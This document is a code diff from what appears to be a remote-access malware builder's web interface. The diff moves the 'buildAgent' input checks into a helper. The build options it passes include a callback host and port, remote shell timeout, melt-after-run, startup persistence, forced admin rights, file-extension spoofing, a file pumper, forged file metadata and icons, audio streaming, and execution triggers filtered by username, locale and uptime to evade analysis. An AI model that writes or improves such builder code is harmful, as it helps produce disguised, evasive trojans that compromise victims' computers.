@@ -17,34 +17,29 @@
                 ANTI_TAMPER_BADGES,
                 ARCHITECTURE_OPTIONS_BY_OS,
                 DEFAULT_FILE_INFORMATION,
-		EXTENSION_OPTIONS_BY_OS,
-		EXTENSION_SPOOF_PRESETS,
-		FILE_PUMPER_UNIT_TO_BYTES,
-		MAX_FILE_PUMPER_BYTES,
-		type CookieKV,
-		type ExtensionSpoofPreset,
-		type FilePumperUnit,
-		type HeaderKV,
-		type TargetArch,
-		type TargetOS
-	} from './lib/constants.js';
-	import {
-		addCustomCookie as createCustomCookie,
-		addCustomHeader as createCustomHeader,
+                EXTENSION_OPTIONS_BY_OS,
+                EXTENSION_SPOOF_PRESETS,
+                type CookieKV,
+                type ExtensionSpoofPreset,
+                type FilePumperUnit,
+                type HeaderKV,
+                type TargetArch,
+                type TargetOS
+        } from './lib/constants.js';
+        import {
+                addCustomCookie as createCustomCookie,
+                addCustomHeader as createCustomHeader,
                 generateMutexName as randomMutexSuffix,
                 normalizeSpoofExtension,
-                parseListInput,
                 removeCustomCookie as deleteCustomCookie,
                 removeCustomHeader as deleteCustomHeader,
-                sanitizeFileInformation as sanitizeFileInformationPayload,
                 sanitizeMutexName,
-                toIsoDateTime,
                 updateCustomCookie as writeCustomCookie,
                 updateCustomHeader as writeCustomHeader,
                 validateSpoofExtension,
                 withPresetSpoofExtension
-	} from './lib/utils.js';
-	import type { BuildRequest } from '../../../../../shared/types/build';
+        } from './lib/utils.js';
+        import { prepareBuildRequest } from './lib/build-request.js';
 
 	type BuildStatus = 'idle' | 'running' | 'success' | 'error';
 
@@ -540,334 +535,97 @@
 		fileIconError = null;
 	}
 
-	async function buildAgent() {
-		if (buildStatus === 'running') {
-			return;
-		}
+        async function buildAgent() {
+                if (buildStatus === 'running') {
+                        return;
+                }
 
-		resetProgress();
+                resetProgress();
 
-		const trimmedHost = host.trim();
-		const trimmedPort = port.trim();
-		const trimmedPollInterval = pollIntervalMs.trim();
-		const trimmedMaxBackoff = maxBackoffMs.trim();
-		const trimmedShellTimeout = shellTimeoutSeconds.trim();
+                const buildResult = prepareBuildRequest({
+                        host,
+                        port,
+                        effectiveOutputFilename,
+                        outputExtension,
+                        targetOS,
+                        targetArch,
+                        installationPath,
+                        meltAfterRun,
+                        startupOnBoot,
+                        developerMode,
+                        mutexName,
+                        compressBinary,
+                        forceAdmin,
+                        pollIntervalMs,
+                        maxBackoffMs,
+                        shellTimeoutSeconds,
+                        customHeaders,
+                        customCookies,
+                        watchdogEnabled,
+                        watchdogIntervalSeconds,
+                        enableFilePumper,
+                        filePumperTargetSize,
+                        filePumperUnit,
+                        executionDelaySeconds,
+                        executionMinUptimeMinutes,
+                        executionAllowedUsernames,
+                        executionAllowedLocales,
+                        executionStartDate,
+                        executionEndDate,
+                        executionRequireInternet,
+                        audioStreamingTouched,
+                        audioStreamingEnabled,
+                        fileIconName,
+                        fileIconData,
+                        fileInformation,
+                        isWindowsTarget
+                });
 
-		if (!trimmedHost) {
-			buildError = 'Host is required.';
-			pushProgress(buildError, 'error');
-			buildStatus = 'error';
-			return;
-		}
-                if (trimmedPort && !/^\d+$/.test(trimmedPort)) {
-                        buildError = 'Port must be numeric.';
+                if (!buildResult.ok) {
+                        buildError = buildResult.error;
                         pushProgress(buildError, 'error');
                         buildStatus = 'error';
                         return;
                 }
-                if (trimmedPort) {
-                        const numericPort = Number.parseInt(trimmedPort, 10);
-                        if (numericPort < 1 || numericPort > 65535) {
-                                buildError = 'Port must be between 1 and 65535.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
+
+                const { payload, warnings: preflightWarnings } = buildResult;
+
+                buildWarnings = [...preflightWarnings];
+                buildStatus = 'running';
+                await tick();
+                pushProgress('Preparing build request...');
+
+                try {
+                        pushProgress('Dispatching build to compiler environment...');
+                        const response = await fetch('/api/build', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                        });
+
+                        const result = (await response.json()) as BuildResponse;
+                        const responseWarnings = result.warnings ?? [];
+                        buildWarnings = [...preflightWarnings, ...responseWarnings];
+
+                        if (!response.ok || !result.success) {
+                                const message = result.message || 'Failed to build agent.';
+                                throw new Error(message);
                         }
+
+                        pushProgress('Compilation completed. Finalizing artifacts...');
+
+                        downloadUrl = result.downloadUrl ?? null;
+                        outputPath = result.outputPath ?? null;
+
+                        buildStatus = 'success';
+                        pushProgress('Agent binary is ready.', 'success');
+                        notifySharedSecret(result.sharedSecret ?? null);
+                } catch (err) {
+                        buildStatus = 'error';
+                        buildError = err instanceof Error ? err.message : 'Unknown build error.';
+                        pushProgress(buildError, 'error');
                 }
-                if (trimmedPollInterval) {
-                        if (!/^\d+$/.test(trimmedPollInterval)) {
-                                buildError = 'Poll interval must be a positive integer.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
-                        }
-
-                        const pollValue = Number.parseInt(trimmedPollInterval, 10);
-                        if (Number.isNaN(pollValue) || pollValue < 1000 || pollValue > 3_600_000) {
-                                buildError = 'Poll interval must be between 1,000 and 3,600,000 milliseconds.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
-                        }
-                }
-                if (trimmedMaxBackoff) {
-                        if (!/^\d+$/.test(trimmedMaxBackoff)) {
-                                buildError = 'Max backoff must be a positive integer.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
-                        }
-
-                        const backoffValue = Number.parseInt(trimmedMaxBackoff, 10);
-                        if (Number.isNaN(backoffValue) || backoffValue < 1000 || backoffValue > 86_400_000) {
-                                buildError = 'Max backoff must be between 1,000 and 86,400,000 milliseconds.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
-                        }
-                }
-                if (trimmedShellTimeout) {
-                        if (!/^\d+$/.test(trimmedShellTimeout)) {
-                                buildError = 'Shell timeout must be a positive integer.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
-                        }
-
-                        const timeoutValue = Number.parseInt(trimmedShellTimeout, 10);
-                        if (Number.isNaN(timeoutValue) || timeoutValue < 5 || timeoutValue > 7_200) {
-                                buildError = 'Shell timeout must be between 5 and 7,200 seconds.';
-                                pushProgress(buildError, 'error');
-                                buildStatus = 'error';
-                                return;
-                        }
-                }
-
-		const sanitizedHeaders = customHeaders
-			.map((header) => ({
-				key: header.key.trim(),
-				value: header.value.trim()
-			}))
-			.filter((header) => header.key !== '' && header.value !== '');
-
-		const sanitizedCookies = customCookies
-			.map((cookie) => ({
-				name: cookie.name.trim(),
-				value: cookie.value.trim()
-			}))
-			.filter((cookie) => cookie.name !== '' && cookie.value !== '');
-
-		const trimmedWatchdogInterval = watchdogIntervalSeconds.trim();
-		let watchdogIntervalValue: number | null = null;
-		if (watchdogEnabled) {
-			const interval = trimmedWatchdogInterval ? Number(trimmedWatchdogInterval) : 60;
-			if (!Number.isFinite(interval) || interval < 5 || interval > 86_400) {
-				buildError = 'Watchdog interval must be between 5 and 86,400 seconds.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-			watchdogIntervalValue = Math.round(interval);
-		}
-
-		const trimmedFilePumperSize = filePumperTargetSize.trim();
-		let filePumperTargetBytes: number | null = null;
-		if (enableFilePumper) {
-			if (!trimmedFilePumperSize) {
-				buildError = 'Provide a target size for the file pumper or disable the feature.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-
-			const parsedSize = Number.parseFloat(trimmedFilePumperSize);
-			if (!Number.isFinite(parsedSize) || parsedSize <= 0) {
-				buildError = 'File pumper size must be a positive number.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-
-			const multiplier = FILE_PUMPER_UNIT_TO_BYTES[filePumperUnit] ?? FILE_PUMPER_UNIT_TO_BYTES.MB;
-			const computedBytes = Math.round(parsedSize * multiplier);
-			if (
-				!Number.isFinite(computedBytes) ||
-				computedBytes <= 0 ||
-				computedBytes > MAX_FILE_PUMPER_BYTES
-			) {
-				buildError = 'File pumper target size is too large. Maximum supported size is 10 GiB.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-
-			filePumperTargetBytes = computedBytes;
-		}
-
-		const trimmedExecutionDelay = executionDelaySeconds.trim();
-		let executionDelayValue: number | null = null;
-		if (trimmedExecutionDelay) {
-			const parsedDelay = Number.parseInt(trimmedExecutionDelay, 10);
-			if (!Number.isFinite(parsedDelay) || parsedDelay < 0 || parsedDelay > 86_400) {
-				buildError = 'Delayed start must be between 0 and 86,400 seconds.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-			executionDelayValue = parsedDelay;
-		}
-
-		const trimmedExecutionUptime = executionMinUptimeMinutes.trim();
-		let executionUptimeValue: number | null = null;
-		if (trimmedExecutionUptime) {
-			const parsedUptime = Number.parseInt(trimmedExecutionUptime, 10);
-			if (!Number.isFinite(parsedUptime) || parsedUptime < 0 || parsedUptime > 10_080) {
-				buildError = 'Minimum uptime must be between 0 and 10,080 minutes (7 days).';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-			executionUptimeValue = parsedUptime;
-		}
-
-		const allowedUsernames = parseListInput(executionAllowedUsernames);
-		const allowedLocales = parseListInput(executionAllowedLocales);
-
-		const startIso = toIsoDateTime(executionStartDate);
-		if (executionStartDate.trim() && !startIso) {
-			buildError = 'Earliest run time must be a valid date/time.';
-			pushProgress(buildError, 'error');
-			buildStatus = 'error';
-			return;
-		}
-
-		const endIso = toIsoDateTime(executionEndDate);
-		if (executionEndDate.trim() && !endIso) {
-			buildError = 'Latest run time must be a valid date/time.';
-			pushProgress(buildError, 'error');
-			buildStatus = 'error';
-			return;
-		}
-
-		if (startIso && endIso) {
-			const startTime = new Date(startIso).getTime();
-			const endTime = new Date(endIso).getTime();
-			if (Number.isFinite(startTime) && Number.isFinite(endTime) && startTime > endTime) {
-				buildError = 'Earliest run time must be before the latest run time.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				return;
-			}
-		}
-
-		buildStatus = 'running';
-		await tick();
-		pushProgress('Preparing build request...');
-
-		const payload: BuildRequest = {
-			host: trimmedHost,
-			port: trimmedPort || '2332',
-			outputFilename: effectiveOutputFilename,
-			outputExtension,
-			targetOS,
-			targetArch,
-			installationPath: installationPath.trim(),
-			meltAfterRun,
-			startupOnBoot,
-			developerMode,
-			mutexName: mutexName.trim(),
-			compressBinary,
-			forceAdmin
-		};
-
-		if (audioStreamingTouched) {
-			payload.audio = { streaming: audioStreamingEnabled };
-		}
-
-		if (watchdogIntervalValue !== null) {
-			payload.watchdog = {
-				enabled: true,
-				intervalSeconds: watchdogIntervalValue
-			};
-		}
-		if (filePumperTargetBytes !== null) {
-			payload.filePumper = {
-				enabled: true,
-				targetBytes: filePumperTargetBytes
-			};
-		}
-
-		const shouldIncludeExecutionTriggers =
-			executionDelayValue !== null ||
-			executionUptimeValue !== null ||
-			allowedUsernames.length > 0 ||
-			allowedLocales.length > 0 ||
-			Boolean(startIso) ||
-			Boolean(endIso) ||
-			!executionRequireInternet;
-
-		if (shouldIncludeExecutionTriggers) {
-			const executionPayload: Record<string, unknown> = {
-				requireInternet: executionRequireInternet
-			};
-			if (executionDelayValue !== null) {
-				executionPayload.delaySeconds = executionDelayValue;
-			}
-			if (executionUptimeValue !== null) {
-				executionPayload.minUptimeMinutes = executionUptimeValue;
-			}
-			if (allowedUsernames.length > 0) {
-				executionPayload.allowedUsernames = allowedUsernames;
-			}
-			if (allowedLocales.length > 0) {
-				executionPayload.allowedLocales = allowedLocales;
-			}
-			if (startIso) {
-				executionPayload.startTime = startIso;
-			}
-			if (endIso) {
-				executionPayload.endTime = endIso;
-			}
-			payload.executionTriggers = executionPayload;
-		}
-
-		if (sanitizedHeaders.length > 0) {
-			payload.customHeaders = sanitizedHeaders;
-		}
-		if (sanitizedCookies.length > 0) {
-			payload.customCookies = sanitizedCookies;
-		}
-		if (trimmedPollInterval) {
-			payload.pollIntervalMs = trimmedPollInterval;
-		}
-		if (trimmedMaxBackoff) {
-			payload.maxBackoffMs = trimmedMaxBackoff;
-		}
-		if (trimmedShellTimeout) {
-			payload.shellTimeoutSeconds = trimmedShellTimeout;
-		}
-		if (isWindowsTarget && fileIconData) {
-			payload.fileIcon = {
-				name: fileIconName,
-				data: fileIconData
-			};
-		}
-
-		const info = sanitizeFileInformationPayload(fileInformation);
-		if (isWindowsTarget && Object.keys(info).length > 0) {
-			payload.fileInformation = info;
-		}
-
-		try {
-			pushProgress('Dispatching build to compiler environment...');
-			const response = await fetch('/api/build', {
-				method: 'POST',
-				headers: { 'Content-Type': 'application/json' },
-				body: JSON.stringify(payload)
-			});
-
-			const result = (await response.json()) as BuildResponse;
-			buildWarnings = result.warnings ?? [];
-
-			if (!response.ok || !result.success) {
-				const message = result.message || 'Failed to build agent.';
-				throw new Error(message);
-			}
-
-			pushProgress('Compilation completed. Finalizing artifacts...');
-
-			downloadUrl = result.downloadUrl ?? null;
-			outputPath = result.outputPath ?? null;
-
-			buildStatus = 'success';
-			pushProgress('Agent binary is ready.', 'success');
-			notifySharedSecret(result.sharedSecret ?? null);
-		} catch (err) {
-			buildStatus = 'error';
-			buildError = err instanceof Error ? err.message : 'Unknown build error.';
-			pushProgress(buildError, 'error');
-		}
-	}
+        }
 
         onDestroy(() => {
                 clearBuildToasts();
